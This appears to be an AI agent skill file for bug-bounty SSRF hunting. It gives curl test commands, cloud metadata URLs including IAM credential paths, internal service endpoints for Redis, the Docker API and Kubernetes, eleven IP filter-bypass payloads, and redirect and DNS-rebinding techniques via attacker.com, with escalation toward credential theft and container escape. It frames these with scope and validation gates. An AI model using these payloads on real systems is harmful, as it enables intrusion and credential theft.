---
name: hunt-ssrf
description: SSRF hunting with differential testing — cloud metadata access, internal service fingerprinting, port scanning, 11 IP bypass techniques. Every candidate must demonstrate actual internal resource access (not just DNS callback). 7-gate validation mandatory.
---

# SSRF HUNTING — DIFFERENTIAL TESTING METHOD

**SSRF goes from Low (DNS callback) to Critical (RCE) only when you prove internal resource access.**

---

## HYPOTHESIS GENERATION

```
HYPOTHESIS: SSRF on [endpoint]
  Endpoint: [METHOD] [URL with URL parameter]
  Parameter: [param_name]
  Precondition: [authenticated/unauthenticated]
  Expected: Only external URLs fetched
  Attack: Access internal services (169.254.169.254, localhost)
  Impact: Infrastructure compromise / credential theft
  Confidence: [HIGH/MEDIUM/LOW]
```

---

## DIFFERENTIAL TESTING METHOD

### Core Principle

> **The vulnerability is not that the server fetches a URL. The vulnerability is that it fetches an INTERNAL URL it shouldn't be able to reach.**

### The Differential Matrix

```
TEST MATRIX:
  External URL (httpbin.org/ip) → 200 (baseline — should work)
  Internal URL (169.254.169.254) → 200 (should FAIL)
  Localhost (localhost:6379) → 200 (should FAIL)
  Cloud metadata → 200 (should FAIL)

FINDING: If internal URL is accessible → SSRF CONFIRMED
NOT A FINDING: If only external URLs work → correctly filtered
```

### Implementation

```bash
TARGET="https://target.com/api/fetch?url="
PARAM="url"

# Step 1: Baseline — external URL works
echo "=== BASELINE: External URL ==="
curl -s "$TARGEThttp://httpbin.org/ip"
# EXPECTED: httpbin response

# Step 2: Differential — cloud metadata
echo "=== DIFFERENTIAL: AWS Metadata ==="
curl -s "$TARGEThttp://169.254.169.254/latest/meta-data/"
# EXPECTED: 403/404/error (blocked)
# IF RETURNS METADATA → SSRF CONFIRMED

# Step 3: Differential — internal services
echo "=== DIFFERENTIAL: Internal Redis ==="
curl -s "$TARGEThttp://localhost:6379"
# EXPECTED: error/timeout (blocked)
# IF RETURNS Redis response → SSRF CONFIRMED
```

---

## CLOUD METADATA ENDPOINTS

### AWS

```bash
# IMDSv1 (if enabled)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2 (requires token — SSRF can still work if you can chain)
# First: PUT to get token
# Then: Use token in header
```

### GCP

```bash
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Header: Metadata-Flavor: Google
```

### Azure

```bash
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

---

## INTERNAL SERVICE FINGERPRINTING

```bash
# Redis (unauthenticated)
http://localhost:6379
# Response: +PONG or redis version string

# Elasticsearch
http://localhost:9200/_cat/indices
http://localhost:9200/_nodes/settings

# MongoDB
http://localhost:27017

# Docker API
http://localhost:2375/containers/json
http://localhost:2375/version

# Kubernetes API
https://localhost:6443/api/v1/namespaces

# etcd
http://localhost:2379/v2/keys

# Consul
http://localhost:8500/v1/agent/members

# Jenkins
http://localhost:8080/api/json

# Grafana
http://localhost:3000/api/dashboards
```

---

## 11 SSRF IP BYPASS TECHNIQUES

| # | Technique | Example | When to Use |
|---|-----------|---------|-------------|
| 1 | Decimal IP | `http://2130706433` | WAF blocks dotted notation |
| 2 | Octal IP | `http://0177.0.0.1` | Parser confusion |
| 3 | Hex IP | `http://0x7f.0x0.0x0.0x1` | URL filter bypass |
| 4 | Short IP | `http://127.1` | Abbreviated notation |
| 5 | IPv6 | `http://[::1]` | IPv6-supported stack |
| 6 | IPv6 mapped | `http://[::ffff:127.0.0.1]` | Dual-stack servers |
| 7 | DNS rebinding | Attacker DNS → internal IP | First check = external |
| 8 | Redirect chain | External URL → 302 to internal | Server follows redirects |
| 9 | URL parser confusion | `http://attacker.com#@internal` | Parser inconsistency |
| 10 | CNAME to internal | Attacker domain → internal hostname | DNS points inward |
| 11 | Full-width period | `http://127。0。0。1` | Unicode normalization |

### Redirect Chain Technique

```bash
# Host a URL that redirects to internal
# On attacker server:
# echo "Redirecting..." > /var/www/html/redirect.html
# Or use: https://attacker.com/redir (302 → http://169.254.169.254/)

curl -s "https://target.com/api/fetch?url=https://attacker.com/redir"
# If server follows redirect → SSRF via redirect chain
```

### DNS Rebinding Technique

```bash
# Host DNS that resolves to external first, then internal
# attacker.com → 1.2.3.4 (first lookup)
# attacker.com → 169.254.169.254 (second lookup, after validation)

# Tools: rbndr.us, rebinder, or custom DNS server
```

---

## GATE VALIDATION CHECKLIST

### Gate 1 — Scope
- [ ] Affected endpoint is in scope

### Gate 2 — Security Boundary
- [ ] Internet → internal service boundary crossed
- [ ] What internal resource was accessed?

### Gate 3 — Attacker Capability
- [ ] Starting position: unauthenticated or authenticated (document which)

### Gate 4 — Reproducibility
- [ ] Exact request/response captured
- [ ] Internal resource content shown in response

### Gate 5 — Impact
- [ ] Select impact:
  - DNS callback only → Low (informational)
  - Internal service access → Medium
  - Cloud metadata → High
  - Cloud metadata + IAM keys → Critical
  - Redis/K8s/Docker access → Critical (potential RCE)

### Gate 6 — False Positive Elimination
- [ ] Response contains ACTUAL internal resource data (not timeout/error)
- [ ] DNS callback was verified (not just assumed)
- [ ] Not a public endpoint that's designed to fetch URLs

### Gate 7 — Program Acceptance
- [ ] SSRF is in scope
- [ ] Impact level meets severity threshold

---

## ESCALATION PATHS

```
SSRF (DNS callback only) → Low → chain with other findings
SSRF (internal service access) → Medium → enumerate internal network
SSRF (cloud metadata) → High → extract IAM credentials
SSRF (cloud metadata + IAM keys) → Critical → access S3, Lambda, etc.
SSRF (Redis access) → Critical → write to Redis, potential RCE
SSRF (Docker API) → Critical → create privileged container → host escape
SSRF (Kubernetes API) → Critical → deploy malicious pod → RCE
```

---

## COMMON FALSE POSITIVES

```
FALSE POSITIVE: "DNS callback received"
REALITY: DNS callback alone = Low severity
  → Need to prove actual internal resource ACCESS
  → Verify: Did the response contain internal data?

FALSE POSITIVE: "Server fetched my URL"
REALITY: Fetching external URLs is normal behavior
  → Need to prove it can reach INTERNAL resources
  → Verify: Can it reach 169.254.169.254 or localhost?

FALSE POSITIVE: "Server follows redirects"
REALITY: Redirects to external URLs are normal
  → Need to prove it follows redirects to INTERNAL URLs
  → Verify: Does it follow redirect to 127.0.0.1?
```
